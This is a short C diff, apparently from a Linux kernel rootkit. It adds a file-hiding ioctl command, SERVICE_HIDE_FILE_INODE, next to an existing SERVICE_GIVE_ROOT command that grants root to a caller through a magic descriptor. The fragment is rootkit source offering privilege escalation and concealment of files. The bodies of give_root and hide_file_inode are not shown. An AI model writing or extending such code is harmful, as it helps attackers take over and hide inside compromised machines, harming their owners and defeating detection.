@@ -3,6 +3,7 @@
 #include "service.h"
 #include "load.h"
 #include "privileges.h"
+#include "hide.h"
 
 unsigned int service_fd = 666;
 unsigned long ping_arg = 666;
@@ -37,6 +38,9 @@ int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
             break;
         case SERVICE_GIVE_ROOT:
             give_root((int)arg);
+            break;
+        case SERVICE_HIDE_FILE_INODE:
+            hide_file_inode(arg);
             break;
     }
     /*
